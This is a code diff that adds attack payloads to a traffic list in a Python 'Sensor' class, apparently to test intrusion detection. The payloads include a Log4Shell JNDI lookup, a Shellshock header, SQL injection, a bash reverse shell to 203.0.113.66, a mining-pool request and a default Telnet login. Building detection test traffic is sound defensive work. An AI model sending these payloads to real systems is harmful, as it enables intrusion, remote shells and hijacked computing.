@@ -160,6 +160,12 @@ class Sensor:
             ("udp", 53, b"\x00\x01" + b"averylongsubdomainusedfordnstunnelingexfiltration0123456789" + b"\x00"),
             ("tcp", 80, b"GET /shell/cmd.php?c=whoami HTTP/1.1\r\n"),
             ("tcp", 1337, b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1f"),
+            ("tcp", 80, b"GET /?x=${jndi:ldap://203.0.113.66:1389/a} HTTP/1.1\r\n"),
+            ("tcp", 80, b"GET /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /bin/id\r\n"),
+            ("tcp", 80, b"GET /login.php?user=1' OR '1'='1 HTTP/1.1\r\nUser-Agent: sqlmap/1.7\r\n"),
+            ("tcp", 9001, b"bash -i >& /dev/tcp/203.0.113.66/9001 0>&1"),
+            ("tcp", 3333, b'{"id":1,"method":"mining.subscribe","params":["cpuminer/2.5"]}'),
+            ("tcp", 23, b"root\r\nxc3511\r\n"),
         ]
         while not self._stop.is_set():
             # burst of benign traffic
